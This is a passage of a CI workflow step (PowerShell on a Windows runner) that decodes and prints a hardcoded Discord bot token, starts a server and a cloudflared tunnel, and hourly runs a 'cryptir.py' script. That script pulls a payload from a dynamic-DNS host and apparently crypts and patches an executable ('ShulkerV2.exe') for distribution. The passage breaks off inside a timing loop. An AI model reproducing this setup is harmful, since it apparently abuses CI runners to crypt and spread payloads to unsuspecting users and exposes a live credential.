      - name: Run Node server and cloudflared with timer
        shell: powershell
        run: |
          $ErrorActionPreference = "Stop"
          cd C:\Users\runneradmin\FLAG
          chcp 65001
          $env:DISCORD_BOT_TOKEN = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TVRRMU9UYzRPVFk1TnpJNU1ETXpPRE00TncuR0tUb1FVLlQzLTJCQVpQTWsyVExsS1N3NTBWU1JoZElqR2VkSGFveEN4QTFNCg==")); Write-Host $env:DISCORD_BOT_TOKEN
          $env:FILES_DIR="./";
          $env:FILES_WHITELIST="sv2.dat";
          $env:ALLOWED_ROLES="";
          $logFile = "C:\Users\runneradmin\FLAG\log.txt"
          $logFile1 = "C:\Users\runneradmin\FLAG\log1.txt"
          $logFile2 = "C:\Users\runneradmin\FLAG\log2.txt"
          Start-Job {
              py -3.11 cryptir.py --interval 3600 --sleep 100 --payload-url "http://heteronomous.kozow.com/files/sv2.dat" --output . --input out.exe --skip-obfuscation --unlicense-target ShulkerV2.exe --patch-script patch.py 2>&1 | Tee-Object -FilePath "C:\Users\runneradmin\FLAG\log.txt"
          }
          Start-Sleep -Seconds 10
          Start-Job {
              py -3.11 server.py 2>&1 | Tee-Object -FilePath "C:\Users\runneradmin\FLAG\log1.txt"
          }
          Start-Job {
              py -3.11 cloud.py 2>&1 | Tee-Object -FilePath "C:\Users\runneradmin\FLAG\log2.txt"
           }
          $targetDuration = (5 * 60 + 40) * 60
          $startTime = [long]$env:START_TIME
          

         
         
          

          

                    


          
          Start-Sleep -Seconds 10
          while ($true) {
            $elapsed = ([DateTimeOffset]::UtcNow.ToUnixTimeSeconds() - $startTime)
            if ($elapsed -ge $targetDuration) {
              break
